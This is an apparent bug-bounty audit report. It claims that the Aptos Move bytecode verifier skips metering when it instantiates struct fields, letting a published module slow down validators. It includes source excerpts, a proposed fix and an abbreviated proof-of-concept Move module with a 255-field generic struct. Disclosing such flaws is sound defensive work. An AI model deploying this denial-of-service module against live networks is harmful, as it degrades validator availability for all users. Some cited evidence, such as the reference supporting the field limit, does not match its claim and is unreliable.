# Audit Report

## Title
Type Instantiation CPU Exhaustion via Unmetered Struct Field Expansion in Bytecode Verification

## Summary
The bytecode verifier performs type instantiation for all struct fields without proper metering in `type_fields_signature()`, allowing attackers to cause O(num_fields × type_complexity) CPU usage during module verification while only being charged for O(type_complexity) in complexity checks. This enables validator node slowdowns through maliciously crafted Move modules.

## Finding Description

The vulnerability exists in the bytecode verification pipeline, specifically in how generic struct instantiations are metered during the type safety verification pass.

During static complexity checking, `meter_struct_instantiation()` only meters the type parameters signature: [1](#0-0) 

However, during bytecode verification, when the verifier encounters a `PackGeneric` instruction, it calls `type_fields_signature()` which performs full type instantiation for every field: [2](#0-1) 

The critical issue is at line 404 where the meter parameter is explicitly unused with a TODO comment indicating missing metering implementation. This function then calls `instantiate()` recursively for each field: [3](#0-2) 

The `instantiate()` function recursively traverses the entire type tree, performing O(type_depth) work per field, but this work is completely unmetered.

**Attack Path:**
1. Attacker creates a struct with the maximum allowed fields (255 per binary format limit) with generic type parameter
2. Production configuration allows unlimited fields: [4](#0-3) 
3. Attacker instantiates the struct with a deeply nested type (e.g., `vector<vector<vector<vector<u64>>>>`)
4. During verification, the verifier only charges for the type parameters (5 nodes) via `charge_tys`: [5](#0-4) 
5. But then performs 255 × 5 = 1,275 type node traversals without additional metering
6. This bypasses the `max_per_fun_meter_units` limit intended to prevent excessive verification cost

## Impact Explanation

This vulnerability enables **High Severity** validator node slowdowns as defined in the Aptos bug bounty program. An attacker can:

- Cause significant CPU exhaustion on all validators during module verification
- Delay block production and consensus progress
- Potentially trigger verification timeouts
- Force validators to process malicious modules repeatedly if published in successive transactions

While runtime gas metering will eventually catch the complexity during execution: [6](#0-5) , the damage occurs during the verification phase before execution, affecting all validators that process the module publication transaction.

The attack does not require validator privileges and can be executed by any account capable of publishing modules. The verification slowdown affects deterministic execution invariant by causing timing variations across validators.

## Likelihood Explanation

**High likelihood** - The attack is:
- **Easy to execute**: Simply publish a Move module with a struct containing 255 fields of type `T`, then use `PackGeneric` with a nested type
- **Low cost**: Only requires gas for module publication
- **Guaranteed impact**: Every validator must verify the module, causing CPU exhaustion
- **Repeatable**: Attacker can publish multiple such modules or include multiple such structs in one module
- **Currently unmitigated**: The TODO comment confirms metering is not implemented

The binary format explicitly allows up to 255 fields: [7](#0-6) , and production configuration sets no limit on struct field count, making this attack fully viable in production.

## Recommendation

Implement proper metering in `type_fields_signature()` by removing the underscore prefix from the meter parameter and charging for each field instantiation:

```rust
fn type_fields_signature(
    verifier: &mut TypeSafetyChecker,
    meter: &mut impl Meter,  // Remove underscore, enable metering
    offset: CodeOffset,
    struct_def: &StructDefinition,
    variant: Option<VariantIndex>,
    type_args: &Signature,
) -> PartialVMResult<Signature> {
    match (&struct_def.field_information, variant) {
        (StructFieldInformation::Declared(fields), None) => {
            let mut instantiated_fields = Vec::new();
            for field_def in fields {
                let instantiated = instantiate(&field_def.signature.0, type_args);
                // Charge for the instantiated field type
                verifier.charge_ty(meter, &instantiated)?;
                instantiated_fields.push(instantiated);
            }
            Ok(Signature(instantiated_fields))
        },
        // Similar for variants...
    }
}
```

Additionally, consider enforcing a reasonable `max_fields_in_struct` limit in production configuration (e.g., 128 fields) to reduce the attack surface.

## Proof of Concept

```move
module attacker::dos {
    struct ManyFields<T> has drop {
        f1: T, f2: T, f3: T, f4: T, f5: T, f6: T, f7: T, f8: T, f9: T, f10: T,
        f11: T, f12: T, f13: T, f14: T, f15: T, f16: T, f17: T, f18: T, f19: T, f20: T,
        // ... repeat up to 255 fields
        f250: T, f251: T, f252: T, f253: T, f254: T, f255: T
    }
    
    public fun trigger_verification_dos() {
        // This will cause 255 × 5 = 1,275 unmetered type node traversals during verification
        let _ = ManyFields<vector<vector<vector<vector<u64>>>>> {
            f1: vector[], f2: vector[], f3: vector[], f4: vector[], f5: vector[],
            f6: vector[], f7: vector[], f8: vector[], f9: vector[], f10: vector[],
            // ... all 255 fields
            f250: vector[], f251: vector[], f252: vector[], f253: vector[], 
            f254: vector[], f255: vector[]
        };
    }
}
```

When this module is published, every validator will perform extensive unmetered type instantiation during bytecode verification, causing CPU exhaustion proportional to the number of fields × type depth. With 255 fields and a 5-level nested type, this performs ~1,275 type traversals without proper metering, while the complexity check only accounts for ~255 + 40 = 295 units.

### Citations

**File:** third_party/move/move-binary-format/src/check_complexity.rs (L126-137)
```rust
    fn meter_struct_instantiation(
        &self,
        struct_inst_idx: StructDefInstantiationIndex,
    ) -> PartialVMResult<()> {
        let struct_insts = self.resolver.struct_instantiations().ok_or_else(|| {
            PartialVMError::new(StatusCode::UNKNOWN_INVARIANT_VIOLATION_ERROR)
                .with_message("Can't get struct instantiations -- not a module.".to_string())
        })?;
        let struct_inst = safe_get_table(struct_insts, struct_inst_idx.0)?;

        self.meter_signature(struct_inst.type_parameters)
    }
```

**File:** third_party/move/move-bytecode-verifier/src/type_safety.rs (L402-416)
```rust
fn type_fields_signature(
    verifier: &mut TypeSafetyChecker,
    _meter: &mut impl Meter, // TODO: metering
    offset: CodeOffset,
    struct_def: &StructDefinition,
    variant: Option<VariantIndex>,
    type_args: &Signature,
) -> PartialVMResult<Signature> {
    match (&struct_def.field_information, variant) {
        (StructFieldInformation::Declared(fields), None) => Ok(Signature(
            fields
                .iter()
                .map(|field_def| instantiate(&field_def.signature.0, type_args))
                .collect(),
        )),
```

**File:** third_party/move/move-bytecode-verifier/src/type_safety.rs (L890-895)
```rust
        Bytecode::PackGeneric(idx) => {
            let struct_inst = verifier.resolver.struct_instantiation_at(*idx)?;
            let struct_def = verifier.resolver.struct_def_at(struct_inst.def)?;
            let type_args = verifier.resolver.signature_at(struct_inst.type_parameters);
            verifier.charge_tys(meter, &type_args.0)?;
            pack(verifier, meter, offset, struct_def, None, type_args)?
```

**File:** third_party/move/move-bytecode-verifier/src/type_safety.rs (L1348-1388)
```rust
fn instantiate(token: &SignatureToken, subst: &Signature) -> SignatureToken {
    use SignatureToken::*;

    if subst.0.is_empty() {
        return token.clone();
    }

    let inst_vec = |v: &[SignatureToken]| -> Vec<SignatureToken> {
        v.iter().map(|ty| instantiate(ty, subst)).collect()
    };
    match token {
        Bool => Bool,
        U8 => U8,
        U16 => U16,
        U32 => U32,
        U64 => U64,
        U128 => U128,
        U256 => U256,
        I8 => I8,
        I16 => I16,
        I32 => I32,
        I64 => I64,
        I128 => I128,
        I256 => I256,
        Address => Address,
        Signer => Signer,
        Vector(ty) => Vector(Box::new(instantiate(ty, subst))),
        Function(args, result, abilities) => Function(inst_vec(args), inst_vec(result), *abilities),
        Struct(idx) => Struct(*idx),
        StructInstantiation(idx, struct_type_args) => {
            StructInstantiation(*idx, inst_vec(struct_type_args))
        },
        Reference(ty) => Reference(Box::new(instantiate(ty, subst))),
        MutableReference(ty) => MutableReference(Box::new(instantiate(ty, subst))),
        TypeParameter(idx) => {
            // Assume that the caller has previously parsed and verified the structure of the
            // file and that this guarantees that type parameter indices are always in bounds.
            debug_assert!((*idx as usize) < subst.len());
            subst.0[*idx as usize].clone()
        },
    }
```

**File:** aptos-move/aptos-vm-environment/src/prod_configs.rs (L170-170)
```rust
        max_fields_in_struct: None,
```

**File:** third_party/move/move-vm/runtime/src/interpreter.rs (L2344-2347)
```rust
                        let field_tys = frame_cache.get_struct_fields_types(*si_idx, self)?;
                        for (_, ty_count) in field_tys {
                            gas_meter.charge_create_ty(*ty_count)?;
                        }
```

**File:** third_party/move/move-binary-format/src/file_format_common.rs (L770-772)
```rust
        PackGeneric(_) => Opcodes::PACK_GENERIC,
        Unpack(_) => Opcodes::UNPACK,
        UnpackGeneric(_) => Opcodes::UNPACK_GENERIC,
```
